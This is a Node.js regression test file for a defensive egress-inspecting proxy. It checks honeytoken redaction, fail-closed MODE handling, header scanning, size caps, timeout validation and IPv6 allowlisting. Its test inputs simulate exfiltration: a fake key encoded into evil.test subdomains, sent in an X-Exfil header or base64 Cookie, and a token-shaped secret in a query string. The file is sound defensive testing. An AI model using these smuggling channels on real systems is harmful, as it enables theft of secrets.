// T12-fix — regression tests for the post-merge review of #45 (blockers 1-2, should-fix 3, 4, 5, 7, 8).
// Real inspector over real sockets, the real CLI entry point, the real T4 redaction + T3 detectors.
// Uses only the API that existed before the fix, so reverting a fix turns its test red (delete-the-fix).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { randomBytes } from 'node:crypto';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createEgressInspector, configFromEnv, defaultHoneytokens } from '../inspector.mjs';
import { inspectEgress, loadHoneytokens, makeAllowlist } from '../policy.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const INSPECTOR = path.join(HERE, '..', 'inspector.mjs');
const TOKENS = defaultHoneytokens();
const TOKEN = 'dvaa-internal-api-key-xyz'; // DVAA's FAKE planted honeytoken (honeytokens.json)
let upstream, upPort, up6, up6Port, hits;

before(async () => {
  hits = [];
  const handler = (req, res) => { hits.push(req.url); req.resume(); req.on('end', () => res.end('ok')); };
  upstream = http.createServer(handler);
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  upPort = upstream.address().port;
  up6 = http.createServer(handler);
  await new Promise((r) => up6.listen(0, '::1', r));
  up6Port = up6.address().port;
});
after(() => { upstream.close(); up6.close(); });

/** Capture everything the inspector writes to stderr (the ALERT line) while fn runs. */
async function captureStderr(fn) {
  const orig = process.stderr.write.bind(process.stderr);
  let buf = '';
  process.stderr.write = (chunk, ...rest) => { buf += String(chunk); return true; };
  try { const r = await fn(); return { r, stderr: buf }; } finally { process.stderr.write = orig; }
}

async function withInspector(over, fn) {
  const log = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 't12fix-')), 'egress.jsonl');
  const records = [];
  const insp = createEgressInspector({
    mode: 'block', allowHosts: ['127.0.0.1'], honeytokens: TOKENS, log, port: 0, listenHost: '127.0.0.1',
    allowClientCidrs: '127.0.0.0/8', maxBytes: 65536, requestTimeoutMs: 1500, onRecord: (r) => records.push(r), ...over,
  });
  const { port } = await insp.listen();
  try { return await fn({ port, records, log, logText: () => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8') : '') }); } finally { await insp.close(); }
}

function viaProxy(port, target, { method = 'GET', body, headers = {} } = {}) {
  return new Promise((resolve) => {
    const req = http.request({ host: '127.0.0.1', port, method, path: target, headers: { host: new URL(target).host, ...headers } }, (res) => {
      res.resume(); res.on('end', () => resolve(res.statusCode));
    });
    req.on('error', (e) => resolve(e.code));
    req.end(body);
  });
}

function connectVia(port, target) {
  return new Promise((resolve) => {
    const s = net.connect(port, '127.0.0.1', () => s.write(`CONNECT ${target} HTTP/1.1\r\nhost: ${target}\r\n\r\n`));
    let d = ''; s.on('data', (c) => { d += c; if (/\r\n\r\n/.test(d)) s.destroy(); });
    s.on('close', () => resolve(d)); s.on('error', () => resolve(d));
  });
}

/** Run the real CLI. Resolves on its first stdout line (banner; process then killed) or on exit. */
function runCli(env, ms = 4000) {
  return new Promise((resolve) => {
    const p = spawn(process.execPath, [INSPECTOR], { env: { PATH: process.env.PATH, LISTEN_HOST: '127.0.0.1', PORT: '0', ...env } });
    let out = '', err = '', done = false;
    const finish = (r) => { if (done) return; done = true; clearTimeout(t); p.kill('SIGKILL'); resolve({ out, err, ...r }); };
    const t = setTimeout(() => finish({ code: 'timeout' }), ms);
    p.stdout.on('data', (c) => { out += c; if (out.includes('\n')) finish({ code: 'listening' }); });
    p.stderr.on('data', (c) => { err += c; });
    p.on('exit', (code) => finish({ code }));
  });
}

// ---- Blocker 1: honeytoken in the request host is never logged in plaintext --------------------------
test('B1: a honeytoken carried in a non-allowlisted host (raw, hex, base64 subdomain) never reaches JSONL, stderr or sink', async () => {
  const hosts = [
    `${TOKEN}.evil.test`, // raw
    `${Buffer.from(TOKEN).toString('hex')}.evil.test`, // hex (decodable)
    `${Buffer.from(TOKEN).toString('base64').replace(/=+$/, '').toLowerCase()}.evil.test`, // b64, lower-cased by the URL parser
  ];
  for (const mode of ['block', 'observe']) {
    for (const h of hosts) {
      const { stderr } = await captureStderr(() => withInspector({ mode }, async ({ port, records, logText }) => {
        const code = await viaProxy(port, `http://${h}/x`);
        if (mode === 'block') assert.equal(code, 403);
        const all = logText() + JSON.stringify(records);
        assert.ok(records.length >= 1, 'decision recorded');
        assert.equal(records[0].kind, 'ALERT');
        for (const leak of [h, h.split('.')[0], TOKEN]) assert.ok(!all.includes(leak), `${mode}: log/sink leaked ${leak.slice(0, 24)}...`);
        assert.equal(records[0].host, null, 'non-allowlisted host is not logged');
        assert.match(records[0].host_sha256, /^[0-9a-f]{16}$/);
        assert.equal(records[0].host_len, h.length);
      }));
      for (const leak of [h, h.split('.')[0], TOKEN]) assert.ok(!stderr.includes(leak), `${mode}: stderr ALERT leaked ${leak.slice(0, 24)}...`);
      assert.match(stderr, /ALERT sentinel-egress .* host=sha256:[0-9a-f]{16}\/len=\d+/);
    }
  }
});

test('B1: allowlisted hosts are still logged by name (operator config, needed for triage)', async () => {
  await withInspector({}, async ({ port, records }) => {
    assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/fine`), 200);
    assert.equal(records[0].host, '127.0.0.1');
  });
});

// ---- Blocker 2: MODE fails closed -----------------------------------------------------------------
test('B2: MODE unset -> block; exact observe|block case-insensitively; any other value throws', () => {
  assert.equal(configFromEnv({}).mode, 'block');
  assert.equal(configFromEnv({ MODE: '' }).mode, 'block');
  assert.equal(configFromEnv({ MODE: 'BLOCK' }).mode, 'block');
  assert.equal(configFromEnv({ MODE: 'Observe' }).mode, 'observe');
  assert.equal(configFromEnv({ MODE: 'observe' }).mode, 'observe');
  for (const bad of ['blcok', 'on', 'true', ' block', 'block ', 'observe,block', 'monitor']) {
    assert.throws(() => configFromEnv({ MODE: bad }), /MODE/, `MODE=${JSON.stringify(bad)} must throw`);
  }
});

test('B2: the real CLI refuses to start on a typo MODE and starts in block when MODE is unset', async () => {
  const typo = await runCli({ MODE: 'blcok' });
  assert.equal(typo.code, 1, `typo MODE must exit 1, got ${typo.code} out=${typo.out}`);
  assert.match(typo.err, /MODE/);
  const unset = await runCli({});
  assert.equal(unset.code, 'listening');
  assert.match(unset.out, /mode=block /);
});

// ---- Should-fix 3: request headers are scanned and counted toward the cap ---------------------------
test('S3: honeytoken in a forwarded header to an ALLOWLISTED host is denied (raw X-Exfil, base64 Cookie)', async () => {
  await withInspector({}, async ({ port, records }) => {
    const before = hits.length;
    assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/h1`, { headers: { 'X-Exfil': TOKEN } }), 403);
    assert.ok(records[0].reasons.includes('honeytoken_match'), `reasons=${records[0].reasons}`);
    records.length = 0;
    assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/h2`, { headers: { Cookie: `s=${Buffer.from(TOKEN).toString('base64')}` } }), 403);
    assert.ok(records[0].reasons.includes('honeytoken_match'), `reasons=${records[0].reasons}`);
    assert.equal(hits.length, before, 'nothing reached upstream');
  });
});

test('S3: data-rich: honeytoken at the end of a 12 KiB header block (past 8 KiB) is caught', async () => {
  await withInspector({}, async ({ port, records }) => {
    const before = hits.length;
    const headers = {};
    for (let i = 0; i < 12; i++) headers[`x-row-${i}`] = 'r'.repeat(1000);
    headers['x-row-last'] = `tail-${TOKEN}`;
    assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/h3`, { headers }), 403);
    assert.ok(records[0].reasons.includes('honeytoken_match'));
    assert.ok(records[0].header_bytes > 12000, `header_bytes=${records[0].header_bytes}`);
    assert.equal(hits.length, before);
  });
});

test('S3: an 8 KiB header against a 1 KiB cap -> 413 egress_over_cap (headers count toward MAX), never forwarded', async () => {
  await withInspector({ maxBytes: 1024 }, async ({ port, records }) => {
    const before = hits.length;
    assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/h4`, { headers: { 'x-pad': 'a'.repeat(8192) } }), 413);
    assert.deepEqual(records[0].reasons, ['egress_over_cap']);
    assert.ok(records[0].size > 8192);
    assert.equal(hits.length, before);
  });
});

// ---- Should-fix 4: secret_pattern_match alone is evidence, not an ALERT -----------------------------
test('S4: 50 random 30 KB base64 blobs to an allowlisted host: all forwarded, 0 ALERTs, secret evidence still recorded', async () => {
  const { stderr } = await captureStderr(() => withInspector({}, async ({ port, records }) => {
    for (let i = 0; i < 50; i++) {
      assert.equal(await viaProxy(port, `http://127.0.0.1:${upPort}/b64`, { method: 'POST', body: randomBytes(22500).toString('base64') }), 200);
    }
    assert.equal(records.length, 50);
    assert.equal(records.filter((r) => r.kind === 'ALERT').length, 0, 'no ALERT on benign base64');
    assert.ok(records.every((r) => r.alert === null));
    assert.ok(records.some((r) => r.reasons.includes('secret_pattern_match')), 'fixture must exercise the secret-shape path');
  }));
  assert.doesNotMatch(stderr, /ALERT sentinel-egress/);
});

test('S4: secret_pattern_match still rides along as evidence when something else flags', () => {
  const cfg = { mode: 'block', allow: makeAllowlist(['canary']), honeytokens: loadHoneytokens(TOKENS) };
  const v = inspectEgress({ kind: 'http', method: 'GET', url: 'http://evil.test/x?k=ghp_aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6', host: 'evil.test' }, cfg);
  assert.deepEqual([...v.reasons].sort(), ['destination_not_allowlisted', 'secret_pattern_match']);
  assert.equal(v.flagged, true);
  assert.ok(v.alertDoc);
});

// ---- Should-fix 5: timeouts/budget validated as positive integers ------------------------------------
test('S5: non-positive-integer SCAN_BUDGET_MS / REQUEST_TIMEOUT_MS / UPSTREAM_TIMEOUT_MS fail at startup', async () => {
  for (const k of ['SCAN_BUDGET_MS', 'REQUEST_TIMEOUT_MS', 'UPSTREAM_TIMEOUT_MS']) {
    for (const bad of ['abc', '0', '-5', '1.5', 'NaN', '250ms']) {
      assert.throws(() => configFromEnv({ MODE: 'block', [k]: bad }), new RegExp(k), `${k}=${bad}`);
    }
    assert.doesNotThrow(() => configFromEnv({ MODE: 'block', [k]: '300' }));
  }
  const base = { mode: 'block', allowHosts: [], honeytokens: TOKENS, listenHost: '127.0.0.1', allowClientCidrs: '127.0.0.0/8', maxBytes: 65536 };
  for (const k of ['scanBudgetMs', 'requestTimeoutMs', 'upstreamTimeoutMs']) {
    assert.throws(() => createEgressInspector({ ...base, [k]: NaN }), /positive integer/, k);
  }
  const cli = await runCli({ MODE: 'block', SCAN_BUDGET_MS: 'abc' });
  assert.equal(cli.code, 1, `CLI must refuse SCAN_BUDGET_MS=abc, got ${cli.code}`);
});

test('S5: policy fails closed if a NaN budget ever reaches it (scan_timeout, deny)', () => {
  const cfg = { mode: 'observe', allow: makeAllowlist(['canary']), honeytokens: loadHoneytokens(TOKENS), scanBudgetMs: NaN };
  const v = inspectEgress({ kind: 'http', method: 'GET', url: 'http://canary/ok', host: 'canary' }, cfg);
  assert.ok(v.reasons.includes('scan_timeout'));
  assert.equal(v.action, 'deny');
});

// ---- Should-fix 7: IPv6 allowlist matching is the same for http and CONNECT ---------------------------
test('S7: allowlist entry "::1" or "[::1]" matches both http://[::1]/ and CONNECT [::1]:port', async () => {
  for (const entry of ['::1', '[::1]']) {
    await withInspector({ allowHosts: [entry] }, async ({ port, records }) => {
      assert.equal(await viaProxy(port, `http://[::1]:${up6Port}/v6`), 200, `http with allow ${entry}`);
      assert.deepEqual(records[0].reasons, [], `http reasons with allow ${entry}`);
      assert.equal(records[0].host, '::1');
      records.length = 0;
      assert.match(await connectVia(port, `[::1]:${up6Port}`), /200 Connection Established/, `CONNECT with allow ${entry}`);
      assert.deepEqual(records[0].reasons, []);
    });
  }
});

// ---- Should-fix 8: banner prints the real honeytoken count ----------------------------------------
test('S8: CLI banner reports the real number of loaded honeytokens', async () => {
  const r = await runCli({ MODE: 'block' });
  assert.equal(r.code, 'listening', r.err);
  assert.match(r.out, new RegExp(`honeytokens=${TOKENS.length} `));
});
